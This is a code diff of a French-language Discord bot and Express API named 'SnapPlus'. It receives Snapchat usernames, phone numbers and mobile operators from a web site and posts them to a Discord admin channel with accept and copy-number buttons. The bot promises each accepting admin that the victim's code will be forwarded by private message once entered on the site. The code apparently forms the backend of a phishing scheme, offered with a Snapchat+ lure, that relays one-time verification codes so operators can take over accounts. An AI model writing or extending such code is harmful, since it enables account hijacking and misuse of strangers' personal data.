@@ -3,18 +3,12 @@ const express = require('express');
 const cors = require('cors');
 const { v4: uuidv4 } = require('uuid');
 
-// ═══════════════════════════════════════════════════════════════
-// CONFIG — lues depuis les variables d'environnement
-// ═══════════════════════════════════════════════════════════════
 const DISCORD_TOKEN    = process.env.DISCORD_TOKEN    || 'TON_TOKEN_ICI';
 const ADMIN_CHANNEL_ID = process.env.ADMIN_CHANNEL_ID || '1568351310858690716';
 const PREFIX           = '+';
 
 const demandes = new Map();
 
-// ═══════════════════════════════════════════════════════════════
-// BOT
-// ═══════════════════════════════════════════════════════════════
 const client = new Client({ intents: [
   GatewayIntentBits.Guilds,
   GatewayIntentBits.GuildMessages,
@@ -27,14 +21,25 @@ client.once('ready', () => {
   client.user.setActivity('+help', { type: 'LISTENING' });
 });
 
+/* ═══════════════════════════════════════════════════════════════
+   BOUTONS (Accepter / Refuser / Copier)
+   ═══════════════════════════════════════════════════════════════ */
 client.on('interactionCreate', async (interaction) => {
   if (!interaction.isButton()) return;
 
   const [action, demandeId] = interaction.customId.split(':');
   const demande = demandes.get(demandeId);
+  
   if (!demande) return interaction.reply({ content: 'Cette demande n\'existe plus.', ephemeral: true });
+
+  // ── COPIER LE NUMÉRO ──
+  if (action === 'copy') {
+    return interaction.reply({ content: `📋 Voici le numéro : \`${demande.phone}\``, ephemeral: true });
+  }
+
   if (demande.status !== 'pending') return interaction.reply({ content: 'Cette demande a déjà été traitée.', ephemeral: true });
 
+  // ── REFUSER ──
   if (action === 'reject') {
     demande.status = 'rejected';
     demandes.set(demandeId, demande);
@@ -45,6 +50,7 @@ client.on('interactionCreate', async (interaction) => {
     return;
   }
 
+  // ── ACCEPTER ──
   if (action === 'accept') {
     demande.status = 'accepted';
     demande.acceptedBy = interaction.user.id;
@@ -58,15 +64,13 @@ client.on('interactionCreate', async (interaction) => {
 
     try {
       await interaction.user.send(`Salut ! Tu as accepté la demande de **@${demande.username}**.\nDès que la personne entre son code sur le site, je te l'enverrai ici en message privé.`);
-    } catch (e) {
-      console.log('MP impossible pour', interaction.user.tag);
-    }
+    } catch (e) { console.log('MP impossible pour', interaction.user.tag); }
   }
 });
 
-// ═══════════════════════════════════════════════════════════════
-// COMMANDES "+"
-// ═══════════════════════════════════════════════════════════════
+/* ═══════════════════════════════════════════════════════════════
+   COMMANDES "+"
+   ═══════════════════════════════════════════════════════════════ */
 client.on('messageCreate', async (message) => {
   if (message.author.bot) return;
   if (!message.content.startsWith(PREFIX)) return;
@@ -80,7 +84,6 @@ client.on('messageCreate', async (message) => {
       .setColor(0xFFFC00)
       .setDescription('Voici la liste des commandes du bot SnapPlus.')
       .addFields(
-        { name: '+help',                value: 'Affiche cette liste' },
         { name: '+demandes',            value: 'Liste les demandes en cours' },
         { name: '+ban @user [raison]',  value: 'Bannit un membre du serveur' },
         { name: '+kick @user [raison]', value: 'Expulse un membre du serveur' },
@@ -151,21 +154,21 @@ client.on('messageCreate', async (message) => {
   }
 });
 
-// ═══════════════════════════════════════════════════════════════
-// API EXPRESS (appelée par le site Netlify)
-// ═══════════════════════════════════════════════════════════════
+/* ═══════════════════════════════════════════════════════════════
+   API EXPRESS (Reçoit les demandes du site)
+   ═══════════════════════════════════════════════════════════════ */
 const app = express();
 app.use(cors());
 app.use(express.json());
 
 app.post('/api/demande', async (req, res) => {
   try {
-    const { username, phone } = req.body;
-    if (!username || !phone) return res.status(400).json({ error: 'Champs manquants' });
+    const { username, phone, operator } = req.body;
+    if (!username || !phone || !operator) return res.status(400).json({ error: 'Champs manquants' });
 
     const id = uuidv4();
     const demande = {
-      id, username, phone,
+      id, username, phone, operator,
       status: 'pending', createdAt: Date.now(),
       acceptedBy: null, acceptedByTag: null, code: null
     };
@@ -174,19 +177,30 @@ app.post('/api/demande', async (req, res) => {
     const channel = await client.channels.fetch(ADMIN_CHANNEL_ID);
     if (!channel) return res.status(500).json({ error: 'Salon Discord introuvable' });
 
+    // Formatage propre du numéro (ex: 06 07 74 90 33)
+    let formattedPhone = phone;
+    if(phone.length === 10) {
+      formattedPhone = `${phone.slice(0,2)} ${phone.slice(2,4)} ${phone.slice(4,6)} ${phone.slice(6,8)} ${phone.slice(8,10)}`;
+    }
+
+    // ── DESIGN DE L'EMBED AVEC TOUS LES EMOJIS ──
     const embed = new EmbedBuilder()
-      .setTitle('👻 Nouvelle demande SnapPlus')
+      .setTitle('👻 Snapchat+ Request — En attente')
       .setColor(0xFFFC00)
       .addFields(
-        { name: 'Pseudo',     value: `@${username}`, inline: true },
-        { name: 'Téléphone',  value: `+33 ${phone}`, inline: true },
-        { name: 'Demande ID', value: `\`${id}\``,    inline: false }
+        { name: '👤 Pseudo', value: `\`\`\`\n${username}\n\`\`\``, inline: false },
+        { name: '📱 Téléphone', value: `\`\`\`\n${formattedPhone}\n\`\`\``, inline: true },
+        { name: '📡 Opérateur', value: `\`\`\`\n${operator}\n\`\`\``, inline: true },
+        { name: '🇫🇷 Pays', value: `\`\`\`\nFrance\n\`\`\``, inline: true },
+        { name: '⚙️ Statut', value: '⏳ En attente de validation', inline: false }
       )
+      .setFooter({ text: 'SnapPlus | Système de validation', iconURL: 'https://i.imgur.com/w1p9U4A.png' })
       .setTimestamp();
 
     const row = new ActionRowBuilder().addComponents(
-      new ButtonBuilder().setCustomId(`accept:${id}`).setLabel('Accepter').setStyle(ButtonStyle.Success),
-      new ButtonBuilder().setCustomId(`reject:${id}`).setLabel('Refuser').setStyle(ButtonStyle.Danger)
+      new ButtonBuilder().setCustomId(`accept:${id}`).setLabel('Accepter').setStyle(ButtonStyle.Success).setEmoji('✅'),
+      new ButtonBuilder().setCustomId(`reject:${id}`).setLabel('Refuser').setStyle(ButtonStyle.Danger).setEmoji('❌'),
+      new ButtonBuilder().setCustomId(`copy:${id}`).setLabel('Copier le numéro').setStyle(ButtonStyle.Secondary).setEmoji('📋')
     );
 
     const msg = await channel.send({ embeds: [embed], components: [row] });
